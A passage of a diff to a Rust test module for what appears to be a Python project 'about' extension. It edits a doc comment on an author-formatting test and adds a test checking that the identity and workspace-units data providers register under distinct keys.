     /// table nor a bare string is skipped, not fatal to the whole list.
     #[test]
     fn unsupported_author_entry_is_skipped_not_fatal() {
@@ -1144,8 +1245,8 @@ authors = [{ name = "Alice" }, 42]
         assert_eq!(id.authors, vec!["Alice"]);
     }
 
-    /// ERR-2 / TASK-0980: an email-only author renders as `<email>` so
-    /// the python provider matches `extensions-node` `format_person`.
+    /// An email-only author renders as `<email>`, so the Python provider
+    /// matches `extensions-node`'s `format_person`.
     /// Without the brackets, a bare email next to "Name <email>" entries
     /// renders ambiguously in a multi-author card.
     #[test]
@@ -1196,5 +1297,59 @@ version = "0.1.0"
         );
 
         assert_eq!(id.repository.as_deref(), Some("https://github.com/o/r"));
+    }
+
+    /// The `register_data_providers` closure in `impl_extension!` discards
+    /// each `registry.register` result with `let _ =`, so a dropped line
+    /// would silently unregister the packages card. Runs the real closure and
+    /// asserts both providers land under distinct keys and each answers with
+    /// its own payload shape.
+    #[test]
+    fn extension_registers_identity_and_units_providers() {
+        use ops_extension::{DataRegistry, Extension};
+
+        let mut registry = DataRegistry::new();
+        AboutPythonExtension.register_data_providers(&mut registry);
+        assert_eq!(
+            registry.provider_names(),
+            vec!["project_identity", "project_units"],
+            "both providers must land under distinct keys"
+        );
+
+        // Distinct payloads prove distinct providers, not one key answering
+        // twice: identity is a ProjectIdentity object, units an array.
+        let dir = tempfile::tempdir().unwrap();
+        ops_about::test_support::write_file(
+            &dir.path().join("pyproject.toml"),
+            r#"
+[project]
+name = "demo"
+version = "0.1.0"
+
+[tool.uv.workspace]
+members = ["packages/alpha"]
+"#,
+        );
+        ops_about::test_support::write_file(
+            &dir.path().join("packages/alpha/pyproject.toml"),
+            "[project]\nname = \"alpha\"\nversion = \"1.0.0\"\n",
+        );
+        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
+        let identity = registry
+            .provide("project_identity", &mut ctx)
+            .expect("identity provider must answer");
+        assert_eq!(identity["stack_label"], serde_json::json!("Python"));
+        let units = registry
+            .provide("project_units", &mut ctx)
+            .expect("units provider must answer");
+        assert_eq!(
+            units
+                .as_array()
+                .and_then(|a| a.first())
+                .and_then(|u| u.get("name"))
+                .and_then(serde_json::Value::as_str),
+            Some("alpha"),
+            "units payload must list the workspace member: {units}"
+        );
     }
 }
